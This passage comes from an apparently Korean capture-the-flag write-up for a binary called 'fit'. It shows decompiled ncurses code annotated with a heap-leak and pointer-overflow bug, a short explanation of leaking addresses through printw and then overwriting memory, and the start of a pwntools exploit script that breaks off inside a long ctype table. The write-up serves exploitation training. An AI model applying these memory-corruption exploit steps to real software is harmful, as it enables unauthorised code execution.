</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);    <span style="color:#75715e">// heap leak vuln trigger 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">52</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printw</span>(<span style="color:#e6db74">&#34;%ld.%ld&#34;</span>, <span style="color:#f92672">*</span>v4, v4[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)v4[<span style="color:#ae81ff">5</span>];                     <span style="color:#75715e">// AAR ? next pointer can be overflowed 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wmove</span>(stdscr, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">34</span>);
</span></span></code></pre></div><p>출력해줘서 여기서 릭하면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">printw</span>(<span style="color:#66d9ef">__int64</span> a1, ...)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  __va_list_tag va[<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-D8h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+18h] [rbp-C0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">va_start</span>(va, a1);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">vw_printw</span>((<span style="color:#66d9ef">__int64</span>)stdscr, a1, (<span style="color:#66d9ef">__int64</span>)va);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">vw_printw</span>(<span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">__int64</span> a2, <span style="color:#66d9ef">__int64</span> a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_nc_screen_of</span>(a1);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">sub_189A0</span>(v4, a2, a3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v5 )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">waddnstr</span>(a1, v5, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xFFFFFFFFLL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_54;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> v23;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v51 <span style="color:#f92672">=</span> string;
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> v5 <span style="color:#f92672">+</span> (_DWORD)string <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>v51;
</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_nc_screen_of</span>(a1);
</span></span><span style="display:flex;"><span>    v8 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">unctrl_sp</span>(v7, v3);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v8[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">||</span> (v9 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>(), ((<span style="color:#f92672">*</span>v9)[v3] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x4002</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4000</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v25 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>      v26 <span style="color:#f92672">=</span> a1[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>      v27 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>      v28 <span style="color:#f92672">=</span> a1[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>      v29 <span style="color:#f92672">=</span> <span style="color:#a6e22e">BYTE1</span>(v25);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">unctrl_sp</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">**</span>v6; <span style="color:#75715e">// r8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a1 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1496</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> a2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">128</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v3 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x1F</span> <span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)a2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">160</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x5F</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_293A0 <span style="color:#f92672">+</span> word_297C0[v3];
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)a2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">160</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x5F</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v2 )
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>        v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>();
</span></span><span style="display:flex;"><span>        v5 <span style="color:#f92672">=</span> a2;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( ((<span style="color:#f92672">*</span>v6)[a2] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_293A0 <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>off_291A0 <span style="color:#f92672">+</span> v5);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> a2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">128</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_293A0 <span style="color:#f92672">+</span> word_297C0[v3];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>LABEL_7:
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> a2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>unk_293A0 <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>off_291A0 <span style="color:#f92672">+</span> v5);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>특정 범위에 안걸리면 릭이 제대로 되서 간단하게 제대로 된 주소 나올때까지 반복적으로 시도하면 바로 익스할 수 있었지만, printw의 출력 로직을 분석해서 한번에 익스플로잇되도록 만들었다.
겹치는 부분이 생겨서 가짓수가 꽤 나오기 때문에 백트레킹해서 주소가 제대로 나왔는지 확인했다.</p>
<p>이후 AAW로 잘 덮고, 마저 익스했다.</p>
<h3 id="exploit-script-2">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-2">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pyte
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DEBUG <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./fit&#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/usr/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>off <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x2000</span>, <span style="color:#ae81ff">0x25D0</span>] <span style="color:#75715e"># 0x2000, 0x0002346</span>
</span></span><span style="display:flex;"><span>script <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> off:
</span></span><span style="display:flex;"><span>    script <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;brva </span><span style="color:#e6db74">{</span>hex(i)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> DEBUG:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug(e<span style="color:#f92672">.</span>path, gdbscript<span style="color:#f92672">=</span>script)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> :
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(e<span style="color:#f92672">.</span>path)
</span></span><span style="display:flex;"><span>dims <span style="color:#f92672">=</span> (<span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">25</span>)
</span></span><span style="display:flex;"><span>screen <span style="color:#f92672">=</span> pyte<span style="color:#f92672">.</span>Screen(<span style="color:#f92672">*</span>dims)
</span></span><span style="display:flex;"><span>stream <span style="color:#f92672">=</span> pyte<span style="color:#f92672">.</span>ByteStream(screen)
</span></span><span style="display:flex;"><span>sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">feed_stream</span>() <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> stream,screen
</span></span><span style="display:flex;"><span>    stream<span style="color:#f92672">.</span>feed(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2000</span>))
</span></span><span style="display:flex;"><span>    scr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> screen<span style="color:#f92672">.</span>display:
</span></span><span style="display:flex;"><span>        scr <span style="color:#f92672">+=</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> scr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rvuntil</span>(b : bytes) <span style="color:#f92672">-&gt;</span> bytes:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
</span></span><span style="display:flex;"><span>        rv <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2000</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        sleep(<span style="color:#ae81ff">0.01</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> b <span style="color:#f92672">in</span> rv:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(st) <span style="color:#f92672">-&gt;</span> int:
</span></span><span style="display:flex;"><span>    scr <span style="color:#f92672">=</span> feed_stream()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        ans <span style="color:#f92672">=</span> (scr[scr<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;Word:&#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>        stage <span style="color:#f92672">=</span> int(scr[scr<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;Stage&#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>        sl(ans)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> stage <span style="color:#f92672">!=</span> st:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> solve(st)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> solve(st)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> stage
</span></span><span style="display:flex;"><span>ctype_loc <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x2003</span>,  <span style="color:#ae81ff">0x2002</span>,<span style="color:#ae81ff">0x2002</span>, <span style="color:#ae81ff">0x2002</span>, <span style="color:#ae81ff">0x2002</span>,<span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>, <span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x6001</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xd808</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xd508</span>, <span style="color:#ae81ff">0xd508</span>, <span style="color:#ae81ff">0xd508</span>, <span style="color:#ae81ff">0xd508</span>, <span style="color:#ae81ff">0xd508</span>, <span style="color:#ae81ff">0xd508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc508</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>,<span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xd608</span>, <span style="color:#ae81ff">0xd608</span>, <span style="color:#ae81ff">0xd608</span>, <span style="color:#ae81ff">0xd608</span>, <span style="color:#ae81ff">0xd608</span>, <span style="color:#ae81ff">0xd608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc608</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0xc004</span>, <span style="color:#ae81ff">0x0002</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>,<span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span style="color:#ae81ff">0x0000</span>, <span 